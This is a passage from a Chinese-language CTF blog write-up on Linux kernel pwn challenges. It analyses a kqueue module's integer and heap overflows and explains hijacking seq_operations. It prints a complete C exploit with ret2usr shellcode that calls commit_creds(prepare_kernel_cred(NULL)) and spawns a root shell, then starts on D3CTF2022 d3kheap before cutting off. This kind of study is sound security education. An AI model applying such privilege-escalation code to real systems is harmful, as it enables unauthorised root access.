class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint32_t</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;MAX_QUEUES;j++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(kqueues[j] == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(j&gt;MAX_QUEUES)</span><br><span class="line">    err(<span class="string">&quot;[-] No kqueue slot left&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Assign the newly created kqueue to the kqueues */</span></span><br><span class="line">kqueues[j] = <span class="built_in">queue</span>;</span><br><span class="line">queueCount++;</span><br><span class="line">result = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure><p><strong>delete_kqueue</strong></p><p>常规的删除功能，不过这里有个 bug 是先释放后再清零，笔者认为会把 free object 的next 指针给清掉，有可能导致内存泄漏？</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> noinline <span class="type">long</span> <span class="title function_">delete_kqueue</span><span class="params">(<span class="type">request_t</span> request)</span>&#123;</span><br><span class="line">    <span class="comment">/* Check for out of bounds requests */</span></span><br><span class="line">    <span class="keyword">if</span>(request.queue_idx&gt;MAX_QUEUES)</span><br><span class="line">        err(<span class="string">&quot;[-] Invalid idx&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check for existence of the request kqueue */</span></span><br><span class="line">    <span class="built_in">queue</span> *<span class="built_in">queue</span> = kqueues[request.queue_idx];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">queue</span>)</span><br><span class="line">        err(<span class="string">&quot;[-] Requested kqueue does not exist&quot;</span>);</span><br><span class="line"></span><br><span class="line">    kfree(<span class="built_in">queue</span>);</span><br><span class="line">    <span class="built_in">memset</span>(<span class="built_in">queue</span>,<span class="number">0</span>,<span class="built_in">queue</span>-&gt;queue_size);</span><br><span class="line">    kqueues[request.queue_idx] = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>edit_kqueue</strong></p><p>主要是从用户空间拷贝数据到指定 queue_entry-&gt;size，如果给的 entry_idx为 0 则拷到 queue-&gt;data</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> noinline <span class="type">long</span> <span class="title function_">edit_kqueue</span><span class="params">(<span class="type">request_t</span> request)</span>&#123;</span><br><span class="line">    <span class="comment">/* Check the idx of the kqueue */</span></span><br><span class="line">    <span class="keyword">if</span>(request.queue_idx &gt; MAX_QUEUES)</span><br><span class="line">        err(<span class="string">&quot;[-] Invalid kqueue idx&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check if the kqueue exists at that idx */</span></span><br><span class="line">    <span class="built_in">queue</span> *<span class="built_in">queue</span> = kqueues[request.queue_idx];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">queue</span>)</span><br><span class="line">        err(<span class="string">&quot;[-] kqueue does not exist&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check the idx of the kqueue entry */</span></span><br><span class="line">    <span class="keyword">if</span>(request.entry_idx &gt; <span class="built_in">queue</span>-&gt;max_entries)</span><br><span class="line">        err(<span class="string">&quot;[-] Invalid kqueue entry_idx&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Get to the kqueue entry memory */</span></span><br><span class="line">    queue_entry *kqueue_entry = (queue_entry *)(<span class="built_in">queue</span> + (<span class="keyword">sizeof</span>(<span class="built_in">queue</span>)+<span class="number">1</span>)/<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check for the existence of the kqueue entry */</span></span><br><span class="line">    exists = <span class="literal">false</span>;</span><br><span class="line">    <span class="type">uint32_t</span> i=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;<span class="built_in">queue</span>-&gt;max_entries+<span class="number">1</span>;i++)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* If kqueue entry found , do the necessary */</span></span><br><span class="line">        <span class="keyword">if</span>(kqueue_entry &amp;&amp; request.data &amp;&amp; <span class="built_in">queue</span>-&gt;data_size)&#123;</span><br><span class="line">            <span class="keyword">if</span>(kqueue_entry-&gt;idx == request.entry_idx)&#123;</span><br><span class="line">                validate(<span class="built_in">memcpy</span>(kqueue_entry-&gt;data,request.data,<span class="built_in">queue</span>-&gt;data_size));</span><br><span class="line">                exists = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        kqueue_entry = kqueue_entry-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* What if the idx is 0, it means we have to update the main kqueue&#x27;s data */</span></span><br><span class="line">    <span class="keyword">if</span>(request.entry_idx==<span class="number">0</span> &amp;&amp; kqueue_entry &amp;&amp; request.data &amp;&amp; <span class="built_in">queue</span>-&gt;data_size)&#123;</span><br><span class="line">        validate(<span class="built_in">memcpy</span>(<span class="built_in">queue</span>-&gt;data,request.data,<span class="built_in">queue</span>-&gt;data_size));</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!exists)</span><br><span class="line">        <span class="keyword">return</span> NOT_EXISTS;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>save_kqueue_entries</strong></p><p>这个功能主要是分配一块现有 <code>queue-&gt;queue_size</code> 大小的 object 然后把 queue-&gt;data 与其所有 queue_entries-&gt;data 的内容拷贝到上边，而其每次拷贝的字节数用的是我们传入的 <code>request.data_size</code> ，在这里很明显存在堆溢出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> noinline <span class="type">long</span> <span class="title function_">save_kqueue_entries</span><span class="params">(<span class="type">request_t</span> request)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check for out of bounds queue_idx requests */</span></span><br><span class="line">    <span class="keyword">if</span>(request.queue_idx &gt; MAX_QUEUES)</span><br><span class="line">        err(<span class="string">&quot;[-] Invalid kqueue idx&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check if queue is already saved or not */</span></span><br><span class="line">    <span class="keyword">if</span>(isSaved[request.queue_idx]==<span class="literal">true</span>)</span><br><span class="line">        err(<span class="string">&quot;[-] Queue already saved&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">queue</span> *<span class="built_in">queue</span> = validate(kqueues[request.queue_idx]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check if number of requested entries exceed the existing entries */</span></span><br><span class="line">    <span class="keyword">if</span>(request.max_entries &lt; <span class="number">1</span> || request.max_entries &gt; <span class="built_in">queue</span>-&gt;max_entries)</span><br><span class="line">        err(<span class="string">&quot;[-] Invalid entry count&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Allocate memory for the kqueue to be saved */</span></span><br><span class="line">    <span class="type">char</span> *new_queue = validate((<span class="type">char</span> *)kzalloc(<span class="built_in">queue</span>-&gt;queue_size,GFP_KERNEL));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Each saved entry can have its own size */</span></span><br><span class="line">    <span class="keyword">if</span>(request.data_size &gt; <span class="built_in">queue</span>-&gt;queue_size)</span><br><span class="line">        err(<span class="string">&quot;[-] Entry size limit exceed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Copy main&#x27;s queue&#x27;s data */</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">queue</span>-&gt;data &amp;&amp; request.data_size)</span><br><span class="line">        validate(<span class="built_in">memcpy</span>(new_queue,<span class="built_in">queue</span>-&gt;data,request.data_size));</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        err(<span class="string">&quot;[-] Internal error&quot;</span>);</span><br><span class="line">    new_queue += <span class="built_in">queue</span>-&gt;data_size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Get to the entries of the kqueue */</span></span><br><span class="line">    queue_entry *kqueue_entry = (queue_entry *)(<span class="built_in">queue</span> + (<span class="keyword">sizeof</span>(<span class="built_in">queue</span>)+<span class="number">1</span>)/<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* copy all possible kqueue entries */</span></span><br><span class="line">    <span class="type">uint32_t</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;request.max_entries+<span class="number">1</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!kqueue_entry || !kqueue_entry-&gt;data)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span>(kqueue_entry-&gt;data &amp;&amp; request.data_size)</span><br><span class="line">            validate(<span class="built_in">memcpy</span>(new_queue,kqueue_entry-&gt;data,request.data_size));</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            err(<span class="string">&quot;[-] Internal error&quot;</span>);</span><br><span class="line">        kqueue_entry = kqueue_entry-&gt;next;</span><br><span class="line">        new_queue += <span class="built_in">queue</span>-&gt;data_size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Mark the queue as saved */</span></span><br><span class="line">    isSaved[request.queue_idx] = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有个全局数组标识一个 queue 是否 saved 了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> isSaved[MAX_QUEUES] = &#123;<span class="literal">false</span>&#125;</span><br></pre></td></tr></table></figure><h3 id="利用思路-2"><a href="#利用思路-2" class="headerlink" title="利用思路"></a>利用思路</h3><p>在 create_queue 中使用 <code>request.max_entries + 1</code> 来进行判定，因此我们可以传入 0xffffffff 使得其只分配一个 queue 和一个 data 而不分配 queue_entry的同时使得 <code>queue-&gt;max_entries = 0xffffffff</code>，此时我们的 queue-&gt;queue_size 便为 0x18</p><p>前面我们说到在 save_kqueue_entries() 中存在着堆溢出，而在该函数中分配的 object 大小为 queue-&gt;queue_size，即 0x18，应当从 <code>kmalloc-32</code> 中取，那么我们来考虑在该 slab 中可用的结构体,<strong>seq_operations</strong> 这个结构体同样从 <code>kmalloc-32</code> 中分配，当我们打开一个 stat 文件时（如 <code>/proc/self/stat</code> ）便会在内核空间中分配一个 seq_operations 结构体<br>通过这个能够劫持内核执行流</p><p>由于没有开启 smep、smap、kpti，故 ret2usr 的攻击手法在本题中是可行的，但是由于开启了 kaslr 的缘故，我们并不知道 prepare_kernel_cred 和 commit_creds 的地址，似乎无法直接执行 <code>commit_creds(prepare_kernel_cred(NULL))</code></p><p>ScuPax0s 师傅给出了一个美妙的解法：<strong>通过编写 shellcode 在内核栈上找恰当的数据以获得内核基址</strong>，至于怎么找就得调试了,执行<code>commit_creds(prepare_kernel_cred(NULL))</code> 并返回到用户态</p><p><strong>exp:</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint32_t</span>    max_entries;</span><br><span class="line">    <span class="type">uint16_t</span>    data_size;</span><br><span class="line">    <span class="type">uint16_t</span>    entry_idx;</span><br><span class="line">    <span class="type">uint16_t</span>    queue_idx;</span><br><span class="line">    <span class="type">char</span>*       data;</span><br><span class="line">&#125;<span class="type">request_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">long</span> dev_fd;</span><br><span class="line"><span class="type">size_t</span> root_rip;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getRootShell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;   </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Backing from the kernelspace.\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);<span class="comment">// to exit the process normally instead of segmentation fault</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">errExit</span><span class="params">(<span class="type">char</span> * msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">createQueue</span><span class="params">(<span class="type">uint32_t</span> max_entries, <span class="type">uint16_t</span> data_size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">request_t</span> req = </span><br><span class="line">    &#123;</span><br><span class="line">        .max_entries    = max_entries,</span><br><span class="line">        .data_size      = data_size,</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(dev_fd, <span class="number">0xDEADC0DE</span>, &amp;req);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">editQueue</span><span class="params">(<span class="type">uint16_t</span> queue_idx,<span class="type">uint16_t</span> entry_idx,<span class="type">char</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">request_t</span> req =</span><br><span class="line">    &#123;</span><br><span class="line">        .queue_idx  = queue_idx,</span><br><span class="line">        .entry_idx  = entry_idx,</span><br><span class="line">        .data       = data,</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(dev_fd, <span class="number">0xDAADEEEE</span>, &amp;req);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">deleteQueue</span><span class="params">(<span class="type">uint16_t</span> queue_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">request_t</span> req = </span><br><span class="line">    &#123;</span><br><span class="line">        .queue_idx = queue_idx,</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(dev_fd, <span class="number">0xBADDCAFE</span>, &amp;req);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">saveQueue</span><span class="params">(<span class="type">uint16_t</span> queue_idx,<span class="type">uint32_t</span> max_entries,<span class="type">uint16_t</span> data_size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">request_t</span> req =</span><br><span class="line">    &#123;</span><br><span class="line">        .queue_idx      = queue_idx,</span><br><span class="line">        .max_entries    = max_entries,</span><br><span class="line">        .data_size      = data_size,</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(dev_fd, <span class="number">0xB105BABE</span>, &amp;req);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">shellcode</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov r12, [rsp + 0x8];&quot;</span></span><br><span class="line">        <span class="string">&quot;sub r12, 0x201179;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r13, r12;&quot;</span></span><br><span class="line">        <span class="string">&quot;add r12, 0x8c580;&quot;</span>  <span class="comment">// prepare_kernel_cred</span></span><br><span class="line">        <span class="string">&quot;add r13, 0x8c140;&quot;</span>  <span class="comment">// commit_creds</span></span><br><span class="line">        <span class="string">&quot;xor rdi, rdi;&quot;</span></span><br><span class="line">        <span class="string">&quot;call r12;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi, rax;&quot;</span></span><br><span class="line">        <span class="string">&quot;call r13;&quot;</span></span><br><span class="line">        <span class="string">&quot;swapgs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14, user_ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;push r14;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14, user_sp;&quot;</span></span><br><span class="line">        <span class="string">&quot;push r14;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14, user_rflags;&quot;</span></span><br><span class="line">        <span class="string">&quot;push r14;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14, user_cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;push r14;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14, root_rip;&quot;</span></span><br><span class="line">        <span class="string">&quot;push r14;&quot;</span></span><br><span class="line">        <span class="string">&quot;iretq;&quot;</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span>**envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span>        seq_fd[<span class="number">0x200</span>];</span><br><span class="line">    <span class="type">size_t</span>      *page;</span><br><span class="line">    <span class="type">size_t</span>      data[<span class="number">0x20</span>];</span><br><span class="line"></span><br><span class="line">    saveStatus();</span><br><span class="line">    root_rip = (<span class="type">size_t</span>) getRootShell;</span><br><span class="line">    dev_fd = open(<span class="string">&quot;/dev/kqueue&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (dev_fd &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;FAILED to open the dev!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x20</span>; i++)</span><br><span class="line">        data[i] = (<span class="type">size_t</span>) shellcode;</span><br><span class="line"></span><br><span class="line">    createQueue(<span class="number">0xffffffff</span>, <span class="number">0x20</span> * <span class="number">8</span>);</span><br><span class="line">    editQueue(<span class="number">0</span>, <span class="number">0</span>, data);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x200</span>; i++)</span><br><span class="line">        seq_fd[i] = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line">    saveQueue(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0x40</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x200</span>; i++)</span><br><span class="line">        read(seq_fd[i], data, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="D3CTF2022-d3kheap"><a href="#D3CTF2022-d3kheap" class="headerlink" title="D3CTF2022-d3kheap"></a>D3CTF2022-d3kheap</h2><p>又是<code>arttnba3</code>大佬出的题</p><p>常规保护拉满,就不多说了</p><h3 id="模块分析"><a href="#模块分析" class="headerlink" title="模块分析"></a>模块分析</h3><p>模块只注册了ioctl函数,并且只实现了alloc和free两个功能</p><p>alloc会申请一个1024的obj</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">d3kheap_ioctl</span><span class="params">(__int64 a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  _fentry__(a1, a2);</span><br><span class="line">  raw_spin_lock(&amp;spin);</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)a2 != <span class="number">0xDEAD</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)a2 &gt; <span class="number">0xDEAD</span> )</span><br><span class="line">      <span class="keyword">goto</span> 